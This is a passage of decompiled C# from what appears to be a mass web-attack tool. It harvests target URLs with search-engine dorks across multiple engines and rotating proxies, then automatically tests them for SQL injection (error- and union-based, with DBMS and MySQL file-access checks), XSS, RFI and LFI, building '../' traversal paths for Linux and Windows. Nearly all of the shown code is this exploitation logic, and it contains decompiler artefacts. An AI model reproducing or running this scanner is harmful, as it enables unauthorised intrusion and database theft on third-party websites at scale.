										this.int_1 = (int)Math.Round(Math.Round((double)(100 * (this.int_0 + 1)) / (double)(this.int_4 + this.threadPool_0.ThreadCount)));
										this.bcWorker.ReportProgress(this.int_1);
										this.method_1(string.Concat(new string[]
										{
											"[",
											global::Globals.FormatNumbers(this.int_0 + 1, true),
											" | ",
											global::Globals.FormatNumbers(this.int_4, true),
											"] ",
											Conversions.ToString(this.int_1),
											"% ",
											global::Globals.translate_0.GetStr(this, 18, ""),
											" ",
											this.struct10_0.method_0()
										}));
									}
									else
									{
										this.method_1(global::Globals.translate_0.GetStr(this, 20, "") + str);
									}
									try
									{
										Class25 class2 = new Class25();
										class2.String_0 = str;
										Thread thread2 = new Thread(new ParameterizedThreadStart(this.method_217));
										thread2.IsBackground = true;
										thread2.Name = "Pos : " + Conversions.ToString(this.int_0);
										class2.Thread = thread2;
										class2.Index = this.int_0;
										thread2.Start(class2);
										this.threadPool_0.Open(thread2);
										this.threadPool_0.WaitForThreads();
										goto IL_5B3;
									}
									catch (Exception ex2)
									{
										goto IL_5B3;
									}
									goto IL_576;
									IL_592:
									ref int ptr = ref this.int_0;
									this.int_0 = ptr + 1;
									num4++;
									Thread.Sleep(50);
									continue;
									IL_5B3:
									if (this.int_0 % 100 != 0)
									{
										goto IL_592;
									}
									IL_576:
									Class50.smethod_4(base.Name, "URL_List_Line", Conversions.ToString(this.int_0), null);
									goto IL_592;
								}
							}
						}
					}
				}
				else if (this.enum6_0 == MainForm.Enum6.const_4)
				{
					int num5 = Conversions.ToInteger(global::Globals.GetObjectValue(this.numSearchColumnThreads));
					if (num5 > this.list_2.Count)
					{
						num5 = this.list_2.Count;
					}
					this.threadPool_0 = new global::ThreadPool(num5);
					int retry = Conversions.ToInteger(global::Globals.GetObjectValue(this.numHTTPRetry));
					bool currentDB = !Conversions.ToBoolean(global::Globals.GetObjectValue(this.chkSearchColumnAllDBs));
					if (this.list_2.Count == 1)
					{
						this.method_29(ProgressBarStyle.Marquee);
					}
					int num6 = this.list_2.Count - 1;
					this.int_0 = 0;
					while (this.int_0 <= num6)
					{
						if (this.int_0 > 0)
						{
							this.int_1 = (int)Math.Round(Math.Round((double)(100 * (this.int_0 + 1)) / (double)(this.list_2.Count + this.threadPool_0.ThreadCount)));
						}
						this.bcWorker.ReportProgress(this.int_1);
						try
						{
							foreach (string search in this.list_1)
							{
								if (this.method_23())
								{
									this.threadPool_0.AbortThreads();
									break;
								}
								if (num5 > 1)
								{
									if (this.list_2.Count > 1)
									{
										this.method_1(string.Concat(new string[]
										{
											"[",
											global::Globals.FormatNumbers(this.int_0 + 1, true),
											" | ",
											global::Globals.FormatNumbers(this.list_2.Count, true),
											"] ",
											Conversions.ToString(this.int_1),
											"% ",
											global::Globals.translate_0.GetStr(this, 22, ""),
											" ",
											global::Globals.GetObjectValue(this.cmbSearchColumnType).ToString()
										}));
									}
									else
									{
										this.method_1(global::Globals.translate_0.GetStr(this, 22, "") + " " + global::Globals.GetObjectValue(this.cmbSearchColumnType).ToString());
									}
								}
								try
								{
									DataGridViewRow dataGridViewRow = this.list_2[this.int_0];
									Thread thread3 = new Thread(new ParameterizedThreadStart(this.method_218));
									MainForm.Class49 class3 = new MainForm.Class49();
									class3.Int32_0 = this.int_0;
									class3.Thread = thread3;
									class3.Item = dataGridViewRow;
									class3.String_0 = Conversions.ToString(dataGridViewRow.Cells[1].Value);
									class3.Retry = retry;
									class3.o = null;
									class3.CurrentDB = currentDB;
									class3.Count = this.list_2.Count;
									class3.Search = search;
									class3.SearchType = this.checkSearchType_0;
									thread3.Name = "Pos : " + Conversions.ToString(this.int_0);
									thread3.Start(class3);
									this.threadPool_0.Open(thread3);
									this.threadPool_0.WaitForThreads();
								}
								catch (Exception ex3)
								{
								}
								Thread.Sleep(50);
							}
						}
						finally
						{
							List<string>.Enumerator enumerator2;
							((IDisposable)enumerator2).Dispose();
						}
						this.int_0++;
					}
				}
				else if (this.enum6_0 == MainForm.Enum6.const_5)
				{
					int num7 = Conversions.ToInteger(global::Globals.GetObjectValue(this.numThreads));
					if (num7 > this.list_2.Count)
					{
						num7 = this.list_2.Count;
					}
					this.threadPool_0 = new global::ThreadPool(num7);
					int retry2 = Conversions.ToInteger(global::Globals.GetObjectValue(this.numHTTPRetry));
					if (this.list_2.Count == 1)
					{
						this.method_29(ProgressBarStyle.Marquee);
					}
					int num8 = this.list_2.Count - 1;
					this.int_0 = 0;
					while (this.int_0 <= num8)
					{
						this.int_1 = (int)Math.Round(Math.Round((double)(100 * (this.int_0 + 1)) / (double)(this.list_2.Count + this.threadPool_0.ThreadCount)));
						this.bcWorker.ReportProgress(this.int_1);
						if (this.method_23())
						{
							this.threadPool_0.AbortThreads();
							break;
						}
						if (num7 > 1)
						{
							this.method_1(string.Concat(new string[]
							{
								"[",
								global::Globals.FormatNumbers(this.int_0 + 1, true),
								" | ",
								global::Globals.FormatNumbers(this.list_2.Count, true),
								"] ",
								Conversions.ToString(this.int_1),
								"% ",
								global::Globals.translate_0.GetStr(this, 18, ""),
								" ",
								this.struct10_0.method_0()
							}));
						}
						else
						{
							this.method_1(string.Concat(new string[]
							{
								"[",
								global::Globals.FormatNumbers(this.int_0 + 1, true),
								" | ",
								global::Globals.FormatNumbers(this.list_2.Count, true),
								"] ",
								global::Globals.translate_0.GetStr(this, 18, ""),
								" ",
								this.struct10_0.method_0()
							}));
						}
						try
						{
							DataGridViewRow dataGridViewRow2 = this.list_2[this.int_0];
							Thread thread4 = new Thread(new ParameterizedThreadStart(this.method_219));
							MainForm.Class49 class4 = new MainForm.Class49();
							class4.Int32_0 = this.int_0;
							class4.Thread = thread4;
							class4.Item = dataGridViewRow2;
							class4.String_0 = Conversions.ToString(dataGridViewRow2.Cells[1].Value);
							class4.Retry = retry2;
							class4.o = null;
							class4.Count = this.list_2.Count;
							thread4.Name = "Pos : " + Conversions.ToString(this.int_0);
							thread4.Start(class4);
							this.threadPool_0.Open(thread4);
							this.threadPool_0.WaitForThreads();
						}
						catch (Exception ex4)
						{
						}
						Thread.Sleep(50);
						this.int_0++;
					}
				}
				IL_C35:
				global::Globals.G_Taskbar.SetProgressState(ProgressBarState.Indeterminate);
				if (this.enum6_0 != MainForm.Enum6.const_1 & !this.bcWorker.CancellationPending)
				{
					for (;;)
					{
						if (this.enum6_0 == MainForm.Enum6.const_4)
						{
							if (this.int_0 > 1)
							{
								this.method_1(string.Concat(new string[]
								{
									"[",
									global::Globals.FormatNumbers(this.int_0, true),
									" | ",
									global::Globals.FormatNumbers(this.int_0, true),
									"](",
									Conversions.ToString(this.threadPool_0.ThreadCount),
									") ",
									global::Globals.translate_0.GetStr(this, 23, "")
								}));
							}
							else
							{
								this.method_1(global::Globals.translate_0.GetStr(this, 23, ""));
							}
						}
						else if (this.threadPool_0.ThreadCount > 1)
						{
							if (this.int_0 > 1)
							{
								this.method_1(string.Concat(new string[]
								{
									"[",
									global::Globals.FormatNumbers(this.int_0, true),
									" | ",
									global::Globals.FormatNumbers(this.int_0, true),
									"](",
									Conversions.ToString(this.threadPool_0.ThreadCount),
									") ",
									global::Globals.translate_0.GetStr(this, 23, ""),
									" ",
									global::Globals.translate_0.GetStr(this, 24, ""),
									this.struct10_0.method_0()
								}));
							}
							else
							{
								this.method_1(global::Globals.translate_0.GetStr(this, 23, "") + " " + global::Globals.translate_0.GetStr(this, 24, "") + this.struct10_0.method_0());
							}
						}
						if (this.threadPool_0.ThreadCount == 1)
						{
							this.method_29(ProgressBarStyle.Marquee);
						}
						if (this.method_23() || this.threadPool_0.ThreadCount == 0)
						{
							break;
						}
						Thread.Sleep(1000);
					}
				}
			}
			catch (Exception ex5)
			{
				if (!this.bcWorker.CancellationPending)
				{
					e.Result = ex5.Message;
					Interaction.Beep();
				}
			}
			finally
			{
				try
				{
					if (this.enum6_0 == MainForm.Enum6.const_3)
					{
						if (this.int_0 + 1 >= this.int_4 - 1)
						{
							this.int_0 = 1;
						}
						Class50.smethod_4(base.Name, "URL_List_Line", Conversions.ToString(this.int_0), null);
					}
					if (this.bcWorker.CancellationPending)
					{
						e.Result = global::Globals.translate_0.GetStr(this, 16, "");
					}
					if (this.AppControlDomain != null)
					{
						this.AppControlDomain.Terminate();
						this.AppControlDomain = null;
					}
					global::Globals.ReleaseMemory();
				}
				catch (Exception ex6)
				{
					e.Result = ex6.Message;
					Interaction.Beep();
				}
			}
		}
	}

	// Token: 0x06000EC1 RID: 3777 RVA: 0x0005C960 File Offset: 0x0005AB60
	private void method_27(object sender, ProgressChangedEventArgs e)
	{
		if (this.enum6_0 == MainForm.Enum6.const_4)
		{
			this.prbSearchColumn.Value = e.ProgressPercentage;
		}
		else
		{
			this.prbMainStatus.Value = e.ProgressPercentage;
		}
		if (!this.$STATIC$bcWorker_ProgressChanged$20211C12832D$IsLoaded)
		{
			this.$STATIC$bcWorker_ProgressChanged$20211C12832D$IsLoaded = true;
			Random random = new Random(DateTime.Now.Millisecond);
			if (random.Next(1, 500) == 100 && !Conversions.ToBoolean(Class50.smethod_5(base.Name, "chkOptimizeThread", false.ToString(), null)))
			{
				global::Globals.GQueue.method_8();
			}
		}
		global::Globals.G_Taskbar.SetProgressValue(e.ProgressPercentage, 100);
	}

	// Token: 0x06000EC2 RID: 3778 RVA: 0x0005CA14 File Offset: 0x0005AC14
	private void method_28(object sender, RunWorkerCompletedEventArgs e)
	{
		string text = "";
		checked
		{
			try
			{
				bool flag = this.enum6_0 == MainForm.Enum6.const_1 & !e.Cancelled & !this.bool_2;
				if (this.enum6_0 == MainForm.Enum6.const_1)
				{
					if (flag)
					{
						using (new Class8(this))
						{
							MessageBox.Show(this.lblSearchSummary_2.Text, global::Globals.translate_0.GetStr(this, 26, ""), MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
							goto IL_205;
						}
					}
					text = " " + global::Globals.translate_0.GetStr(this, 79, "") + global::Globals.FormatNumbers(global::Globals.GQueue.method_13().int_0, false);
				}
				else if (this.enum6_0 == MainForm.Enum6.const_4)
				{
					if (this.searchColumn_0 != null)
					{
						this.searchColumn_0.CanClose = true;
					}
					if (!Information.IsNothing(this.struct10_0))
					{
						if (this.struct10_0.int_3 > 0)
						{
							text = ", " + global::Globals.translate_0.GetStr("SearchColumn", "mnuRowsCount", "") + " " + global::Globals.FormatNumbers(this.struct10_0.int_3, false);
						}
						else
						{
							text = ", " + global::Globals.translate_0.GetStr(this.DumperForm, 22, "");
						}
						this.struct10_0 = default(MainForm.Struct10);
					}
				}
				else if (this.enum6_0 == MainForm.Enum6.const_5)
				{
					if (!Information.IsNothing(this.struct10_0))
					{
						text = " " + global::Globals.translate_0.GetStr(this, 24, "") + Conversions.ToString(this.struct10_0.int_3);
					}
				}
				else if ((this.enum6_0 == MainForm.Enum6.const_2 | this.enum6_0 == MainForm.Enum6.const_3) && !Information.IsNothing(this.struct10_0))
				{
					text = " " + global::Globals.translate_0.GetStr(this, 24, "") + this.struct10_0.method_0();
				}
				IL_205:
				if (e.Result != null)
				{
					this.method_17(e.Result.ToString() + text);
				}
				else
				{
					this.method_17(global::Globals.translate_0.GetStr(this, 25, "") + text);
				}
				if (this.enum6_0 == MainForm.Enum6.const_1)
				{
					this.txtMultiDorks.Clear();
					int num = this.int_0;
					int num2 = this.list_0.Count - 1;
					for (int i = num; i <= num2; i++)
					{
						this.txtMultiDorks.AppendText(this.list_0[i] + "\r\n");
					}
					this.txtMultiDorks.SelectionStart = 0;
					this.txtMultiDorks.SelectionLength = 1;
				}
				if (this.enum6_0 == MainForm.Enum6.const_4 && this.searchColumn_0 != null)
				{
					if (this.searchColumn_0.lvwData.Items.Count == 0)
					{
						this.searchColumn_0.Dispose();
					}
					else
					{
						this.searchColumn_0.CanClose = true;
					}
				}
				if (this.ReExploiterForm != null)
				{
					this.ReExploiterForm.CanClose = true;
				}
				this.int_1 = 0;
			}
			catch (Exception ex)
			{
				Interaction.Beep();
				this.method_17(string.Concat(new string[]
				{
					global::Globals.translate_0.GetStr(this, 27, ""),
					text,
					"(",
					ex.Message,
					")"
				}));
			}
		}
	}

	// Token: 0x06000EC3 RID: 3779 RVA: 0x0005CDD4 File Offset: 0x0005AFD4
	private void method_29(ProgressBarStyle progressBarStyle_0)
	{
		if (base.InvokeRequired)
		{
			base.Invoke(new MainForm.Delegate47(this.method_29), new object[]
			{
				progressBarStyle_0
			});
		}
		else
		{
			ToolStripProgressBar toolStripProgressBar;
			if (this.enum6_0 == MainForm.Enum6.const_4)
			{
				toolStripProgressBar = this.prbSearchColumn;
			}
			else
			{
				toolStripProgressBar = this.prbMainStatus;
			}
			if (toolStripProgressBar.Style != progressBarStyle_0)
			{
				toolStripProgressBar.Style = progressBarStyle_0;
				if (progressBarStyle_0 == ProgressBarStyle.Marquee)
				{
					global::Globals.G_Taskbar.SetProgressState(ProgressBarState.Indeterminate);
				}
				else
				{
					global::Globals.G_Taskbar.SetProgressState(ProgressBarState.Normal);
				}
			}
		}
	}

	// Token: 0x06000EC4 RID: 3780 RVA: 0x0005CE5C File Offset: 0x0005B05C
	private void method_30(global::Globals.SearchHost searchHost_0)
	{
		checked
		{
			try
			{
				SearchEngine searchEngine = this.dictionary_0[searchHost_0];
				int num = this.list_0.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					searchEngine.Percentage = (int)Math.Round(Math.Round((double)(100 * (i + 1)) / (double)this.list_0.Count));
					searchEngine.StartScanning(this.list_0[i]);
					searchEngine.DorkIndex = i;
					if (((unchecked(-((this.method_23() > false) ? 1 : 0)) ? 1 : 0) | ~this.Int32_2) != 0)
					{
						break;
					}
					if (searchEngine.IPS_BLACK_LISTED)
					{
						using (new Class8(this))
						{
							if (MessageBox.Show(string.Concat(new string[]
							{
								global::Globals.translate_0.GetStr(this, 123, ""),
								" ",
								searchHost_0.ToString(),
								"\r\n",
								global::Globals.translate_0.GetStr(this, 124, "")
							}), global::Globals.translate_0.GetStr(this, 125, ""), MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button2) == DialogResult.No)
							{
								searchEngine.Canceled = true;
								break;
							}
							searchEngine.ClearBlackList();
						}
					}
				}
				searchEngine = null;
			}
			catch (Exception exception_)
			{
				this.method_24(exception_);
			}
		}
	}

	// Token: 0x06000EC5 RID: 3781 RVA: 0x0005CFE4 File Offset: 0x0005B1E4
	private bool method_31()
	{
		bool result;
		try
		{
			foreach (SearchEngine searchEngine in this.dictionary_0.Values)
			{
				if (!(result = searchEngine.IsComplete()))
				{
					break;
				}
			}
		}
		finally
		{
			Dictionary<global::Globals.SearchHost, SearchEngine>.ValueCollection.Enumerator enumerator;
			((IDisposable)enumerator).Dispose();
		}
		return result;
	}

	// Token: 0x06000EC6 RID: 3782 RVA: 0x0005D044 File Offset: 0x0005B244
	internal void method_32()
	{
		checked
		{
			if (this.dictionary_0 != null && !this.method_23())
			{
				if (global::Globals.GMain.InvokeRequired)
				{
					global::Globals.GMain.Invoke(new MainForm.Delegate48(this.method_32));
				}
				else
				{
					Class37.Struct4 @struct = global::Globals.GQueue.method_13();
					int num = this.list_0.Count;
					System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();
					int num2;
					try
					{
						foreach (SearchEngine searchEngine in this.dictionary_0.Values)
						{
							stringBuilder.Append(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("\t", Interaction.IIf(searchEngine.Canceled, "Canceled ", "")), "["), global::Globals.FormatNumbers(searchEngine.DorkIndex + 1, false).PadLeft(this.txtMultiDorks.Lines.Length.ToString().Length + 1, ' ')), "] "), searchEngine.Percentage.ToString().PadLeft(3, ' ')), "% "), searchEngine.Host), " "), global::Globals.FormatNumbers(searchEngine.LinksLoaded, true)), Interaction.IIf(searchEngine.BlackListProxy.Count > 0, " Blocked IPs " + global::Globals.FormatNumbers(searchEngine.BlackListProxy.Count, false), "")), "\r\n"));
							num2 += searchEngine.Percentage;
							if (num > searchEngine.DorkIndex)
							{
								num = searchEngine.DorkIndex;
							}
						}
					}
					finally
					{
						Dictionary<global::Globals.SearchHost, SearchEngine>.ValueCollection.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
					this.lblSearchSummary_1.Text = stringBuilder.ToString();
					this.int_0 = num;
					this.lblSearchSummary_2.Text = string.Concat(new string[]
					{
						global::Globals.translate_0.GetStr(this, 72, ""),
						global::Globals.FormatNumbers(@struct.int_7, false),
						"\r\n",
						global::Globals.translate_0.GetStr(this, 73, ""),
						global::Globals.FormatNumbers(@struct.int_6, false),
						"\r\n",
						global::Globals.translate_0.GetStr(this, 74, ""),
						global::Globals.FormatNumbers(@struct.int_1, false),
						"\r\n",
						global::Globals.translate_0.GetStr(this, 75, ""),
						global::Globals.FormatNumbers(@struct.int_5, false),
						"\r\n",
						global::Globals.translate_0.GetStr(this, 76, ""),
						global::Globals.FormatNumbers(@struct.int_2, false),
						"\r\n",
						global::Globals.translate_0.GetStr(this, 77, ""),
						global::Globals.FormatNumbers(@struct.int_3, false),
						"\r\n",
						global::Globals.translate_0.GetStr(this, 78, ""),
						global::Globals.FormatNumbers(@struct.int_4, false),
						"\r\n",
						global::Globals.translate_0.GetStr(this, 79, ""),
						global::Globals.FormatNumbers(@struct.int_0, false)
					});
					if (num2 == 0)
					{
						num2 = 1;
					}
					this.int_1 = (int)Math.Round(Math.Round((double)num2 / (double)this.dictionary_0.Count));
					this.bcWorker.ReportProgress(this.int_1);
					this.method_1(string.Concat(new string[]
					{
						"[",
						global::Globals.FormatNumbers(this.int_0 + 1, false),
						" | ",
						global::Globals.FormatNumbers(this.list_0.Count, false),
						"] ",
						Conversions.ToString(this.int_1),
						"% ",
						global::Globals.translate_0.GetStr(this, 80, ""),
						global::Globals.FormatNumbers(@struct.int_0, false)
					}));
				}
			}
		}
	}

	// Token: 0x06000EC7 RID: 3783 RVA: 0x00008109 File Offset: 0x00006309
	private void method_33(object sender, EventArgs e)
	{
		this.lstSearchEngine.SelectedItem = null;
	}

	// Token: 0x06000EC8 RID: 3784 RVA: 0x00008117 File Offset: 0x00006317
	private void method_34(object sender, EventArgs e)
	{
		this.grbDorks.Text = global::Globals.translate_0.GetStr(this, 81, "") + global::Globals.FormatNumbers(this.txtMultiDorks.Lines.Length, true);
	}

	// Token: 0x06000EC9 RID: 3785 RVA: 0x0005D488 File Offset: 0x0005B688
	private void method_35(object sender, EventArgs e)
	{
		System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();
		foreach (string text in this.txtMultiDorks.Lines)
		{
			text = text.Trim();
			if (text.Length > 4)
			{
				if (!string.IsNullOrEmpty(stringBuilder.ToString()))
				{
					stringBuilder.AppendLine();
				}
				stringBuilder.Append(text);
			}
		}
		if (!stringBuilder.ToString().Equals(this.txtMultiDorks.Text))
		{
			this.txtMultiDorks.Text = stringBuilder.ToString();
		}
	}

	// Token: 0x06000ECA RID: 3786 RVA: 0x0005D518 File Offset: 0x0005B718
	private void method_36(Class25 class25_0)
	{
		checked
		{
			try
			{
				string text = "";
				if (Class23.smethod_13(class25_0.String_0, true) && !global::Globals.GTrash.method_2(class25_0.String_0))
				{
					class25_0.HTTP = this.AppControlDomain.GetHTTP();
					this.method_42(null, Class23.smethod_11(class25_0.String_0) + " " + global::Globals.translate_0.GetStr(this, 115, ""), -1);
					int num = Conversions.ToInteger(global::Globals.GetObjectValue(this.numHTTPRetry));
					int i = 0;
					while (i <= num)
					{
						text = class25_0.HTTP.QuickGet(class25_0.String_0);
						int num2 = class25_0.HTTP.Status();
						if (string.IsNullOrEmpty(text))
						{
							if (num2 <= 0)
							{
								i++;
								continue;
							}
							text = num2.ToString();
						}
						IL_C2:
						global::Globals.WebServer webServer = (global::Globals.WebServer)class25_0.HTTP.WebServer();
						if (this.method_44("SQL") && (!global::Globals.DG_SQLi.method_10(class25_0.String_0) & !global::Globals.DG_SQLiNoInjectable.method_9(class25_0.String_0)))
						{
							this.method_37(class25_0, text);
						}
						if (string.IsNullOrEmpty(text) || Conversions.ToBoolean(Operators.AndObject(global::Globals.GetObjectValue(this.chkSkipHttpStatus4xx), num2 > 399)))
						{
							goto IL_1CC;
						}
						if (this.method_44("XSS") && !global::Globals.DG_FileInclusao.method_10(class25_0.String_0))
						{
							this.method_40(class25_0, text);
						}
						if ((this.method_44("LFI") & webServer > global::Globals.WebServer.UNKNOW) && !global::Globals.DG_FileInclusao.method_10(class25_0.String_0))
						{
							this.method_38(class25_0, webServer, text);
						}
						if (this.method_44("RFI") && !global::Globals.DG_FileInclusao.method_10(class25_0.String_0))
						{
							this.method_39(class25_0, webServer, text);
							goto IL_1CC;
						}
						goto IL_1CC;
					}
					goto IL_C2;
				}
				IL_1CC:;
			}
			catch (Exception exception_)
			{
				this.method_24(exception_);
			}
			finally
			{
				try
				{
					if (this.AppControlDomain != null)
					{
						this.AppControlDomain.Dispose(class25_0.HTTP);
					}
					if (!this.method_23())
					{
						if (this.enum6_0 == MainForm.Enum6.const_2)
						{
							global::Globals.GQueue.method_5(class25_0.String_0);
						}
						if (string.IsNullOrEmpty(class25_0.String_1) & string.IsNullOrEmpty(class25_0.String_2) & string.IsNullOrEmpty(class25_0.String_3))
						{
							global::Globals.GTrash.method_0(class25_0.String_0);
						}
						if (this.threadPool_0 != null && class25_0 != null)
						{
							this.threadPool_0.Close(class25_0.Thread);
						}
					}
				}
				catch (Exception exception_2)
				{
					this.method_24(exception_2);
				}
			}
		}
	}

	// Token: 0x06000ECB RID: 3787 RVA: 0x0005D814 File Offset: 0x0005BA14
	private bool method_37(Class25 class25_0, string string_5)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		checked
		{
			int num = this.lstAnalizerError.Items.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				if (this.lstAnalizerError.GetItemChecked(i))
				{
					string item = Conversions.ToString(this.lstAnalizerError.Items[i]);
					list2.Add(item);
				}
			}
			int num2 = this.lstAnalizerUnion.Items.Count - 1;
			for (int j = 0; j <= num2; j++)
			{
				if (this.lstAnalizerUnion.GetItemChecked(j))
				{
					string item = Conversions.ToString(this.lstAnalizerUnion.Items[j]);
					list.Add(item);
				}
			}
			Analyzer analyzer = new Analyzer(class25_0.String_0, 2, class25_0.HTTP);
			analyzer.OnProgress += this.method_42;
			analyzer.VectorsUnion = list;
			analyzer.VectorsError = list2;
			analyzer.HtmlOriginalShowSQL = analyzer.IsExploitable(string_5);
			analyzer.SkipMsAcessAndSybase = Conversions.ToBoolean(global::Globals.GetObjectValue(this.chkAnalizeMsAcessSybase));
			string text = "";
			Types dbtype = Types.None;
			string text2 = "";
			if (string.IsNullOrEmpty(string_5))
			{
				string_5 = analyzer.HTML_Load(class25_0.String_0);
			}
			Types types = analyzer.CheckExploit("");
			analyzer.UnionKeyword = Class54.smethod_11(types);
			bool flag;
			if (analyzer.IsExploitable(types))
			{
				if (analyzer.SkipMsAcessAndSybase & (analyzer.DBType == Types.MsAccess | analyzer.DBType == Types.Sybase))
				{
					ref int ptr = ref this.struct10_0.int_4;
					this.struct10_0.int_4 = ptr + 1;
					global::Globals.DG_SQLiNoInjectable.method_1(new string[]
					{
						class25_0.String_0,
						Class54.smethod_5(types),
						"",
						DateAndTime.Now.ToString(CultureInfo.InvariantCulture),
						""
					});
					class25_0.String_3 = class25_0.String_0;
					return false;
				}
				if (analyzer.TryErrorBasead())
				{
					text = analyzer.Version;
					dbtype = analyzer.DBType;
					class25_0.String_3 = analyzer.ResultError;
					flag = true;
				}
				bool flag2;
				if ((flag2 = true) == global::Globals.DG_SQLi.method_10(class25_0.String_0))
				{
					return true;
				}
				if (Conversions.ToBoolean(Conversions.ToBoolean(Operators.CompareObjectEqual(flag2, Operators.AndObject(Class54.smethod_9(analyzer.DBType), global::Globals.GetObjectValue(this.chkAnalizerMySQLErrorUnion)), false)) || Conversions.ToBoolean(Operators.CompareObjectEqual(flag2, Operators.AndObject(Class54.smethod_10(analyzer.DBType), global::Globals.GetObjectValue(this.chkAnalizerMSSQLErrorUnion)), false)) || Conversions.ToBoolean(Operators.CompareObjectEqual(flag2, Operators.AndObject(Class54.smethod_11(analyzer.DBType), global::Globals.GetObjectValue(this.chkAnalizerOracleErrorUnion)), false)) || Conversions.ToBoolean(Operators.CompareObjectEqual(flag2, Operators.AndObject(Class54.smethod_12(analyzer.DBType), global::Globals.GetObjectValue(this.chkAnalizerPostgreErrorUnion)), false)) || flag2 == (!flag & !this.method_23())))
				{
					analyzer.UnionKeyword = (Class54.smethod_11(types) || flag);
					if (analyzer.TryUnionBasead())
					{
						flag = true;
						if (analyzer.ResultUnionColumn > 0)
						{
							class25_0.String_3 = analyzer.ResultUnion;
							text = analyzer.Version;
						}
						else if (!string.IsNullOrEmpty(analyzer.ResultError))
						{
							analyzer.DBType = dbtype;
							class25_0.String_3 = analyzer.ResultError;
						}
						else
						{
							flag = false;
						}
					}
					else
					{
						analyzer.DBType = dbtype;
					}
				}
				if ((flag & !this.method_23()) && Class54.smethod_9(analyzer.DBType) && Conversions.ToBoolean(global::Globals.GetObjectValue(this.chkAnalizeMySQLReadWrite)) && !string.IsNullOrEmpty(analyzer.Version))
				{
					string text3 = "";
					string text4 = "";
					if (analyzer.CheckMySQL_File(class25_0.String_3, ref text3, ref text4))
					{
						text2 = global::Globals.translate_0.GetStr(this, 84, "");
						if (!string.IsNullOrEmpty(text4))
						{
							text2 = string.Concat(new string[]
							{
								text2,
								global::Globals.translate_0.GetStr(this, 85, ""),
								" ",
								text4,
								" "
							});
						}
						if (!string.IsNullOrEmpty(text3))
						{
							text2 = text2 + global::Globals.translate_0.GetStr(this, 86, "") + " " + text3;
						}
					}
				}
				if (flag)
				{
					if (!global::Globals.DG_SQLi.method_10(class25_0.String_0))
					{
						ref int ptr = ref this.struct10_0.int_3;
						this.struct10_0.int_3 = ptr + 1;
						if (string.IsNullOrEmpty(text))
						{
							text = global::Globals.translate_0.GetStr(this, 87, "");
						}
						global::Globals.DG_SQLi.method_1(new string[]
						{
							class25_0.String_3,
							Class54.smethod_5(analyzer.DBType),
							text,
							text2,
							"",
							"",
							DateAndTime.Now.ToString(CultureInfo.InvariantCulture)
						});
					}
				}
				else if (!this.method_23())
				{
					if (analyzer.HtmlOriginalShowSQL)
					{
						class25_0.String_3 = "";
					}
					else
					{
						ref int ptr = ref this.struct10_0.int_4;
						this.struct10_0.int_4 = ptr + 1;
						global::Globals.DG_SQLiNoInjectable.method_1(new string[]
						{
							class25_0.String_0,
							Class54.smethod_5(types),
							"",
							DateAndTime.Now.ToString(CultureInfo.InvariantCulture),
							""
						});
					}
				}
				class25_0.String_3 = class25_0.String_0;
			}
			return flag;
		}
	}

	// Token: 0x06000ECC RID: 3788 RVA: 0x0005DE04 File Offset: 0x0005C004
	private bool method_38(Class25 class25_0, global::Globals.WebServer webServer_0, string string_5)
	{
		Dictionary<string, string> dictionary = new Dictionary<string, string>();
		int num = Conversions.ToInteger(global::Globals.GetObjectValue(this.numHTTPRetry));
		int int_ = Conversions.ToInteger(global::Globals.GetObjectValue(this.numExploitingDelay));
		checked
		{
			if (webServer_0 == global::Globals.WebServer.LINUX)
			{
				try
				{
					foreach (object obj in ((IEnumerable)global::Globals.GetObjectValue(this.lvwLFIpathLinux)))
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						string text = listViewItem.SubItems[1].Text.Trim();
						if (!string_5.ToLower().Contains(text.ToLower()))
						{
							string text2 = listViewItem.Text;
							this.method_43(text2, text, ref dictionary);
							int num2 = Conversions.ToInteger(Operators.SubtractObject(global::Globals.GetObjectValue(this.numLFIpathTraversalCount), 1));
							int i = 1;
							while (i <= num2)
							{
								text2 = "";
								int num3 = 1;
								do
								{
									if (num3 == i & listViewItem.Text.StartsWith("/"))
									{
										text2 += "..";
									}
									else
									{
										text2 += "../";
									}
									if (num3 >= i)
									{
										break;
									}
									num3++;
								}
								while (num3 <= 100);
								IL_126:
								text2 += listViewItem.Text;
								this.method_43(text2, text, ref dictionary);
								i++;
								continue;
								goto IL_126;
							}
						}
					}
					goto IL_233;
				}
				finally
				{
					IEnumerator enumerator;
					if (enumerator is IDisposable)
					{
						(enumerator as IDisposable).Dispose();
					}
				}
			}
			if (webServer_0 == global::Globals.WebServer.WINDOWS)
			{
				if (Conversions.ToBoolean(global::Globals.GetObjectValue(this.chkLfiWindowsSkip)))
				{
					return false;
				}
				try
				{
					foreach (object obj2 in ((IEnumerable)global::Globals.GetObjectValue(this.lvwLFIpathWin)))
					{
						ListViewItem listViewItem2 = (ListViewItem)obj2;
						string text2 = listViewItem2.Text;
						string text = listViewItem2.SubItems[1].Text.Trim();
						if (!string_5.ToLower().Contains(text.ToLower()))
						{
							dictionary.Add(text2, text);
							dictionary.Add(Class23.smethod_7(text2), text);
						}
					}
				}
				finally
				{
					IEnumerator enumerator2;
					if (enumerator2 is IDisposable)
					{
						(enumerator2 as IDisposable).Dispose();
					}
				}
			}
			IL_233:
			bool result;
			if (dictionary.Count == 0)
			{
				result = false;
			}
			else
			{
				Stopwatch stopwatch_ = Stopwatch.StartNew();
				class25_0.HTTP.FollowRedirects = true;
				List<string> list = Class23.smethod_16(class25_0.String_0, "[t]", true);
				try
				{
					List<string>.Enumerator enumerator3 = list.GetEnumerator();
					IL_455:
					while (enumerator3.MoveNext())
					{
						string text3 = enumerator3.Current;
						if (this.method_23())
						{
							return false;
						}
						int num4 = 0;
						do
						{
							if (num4 != 0)
							{
								if (!Conversions.ToBoolean(global::Globals.GetObjectValue(this.chkExploitIgnoreCookies)))
								{
									break;
								}
								class25_0.HTTP.SetAcceptCookies(false);
							}
							try
							{
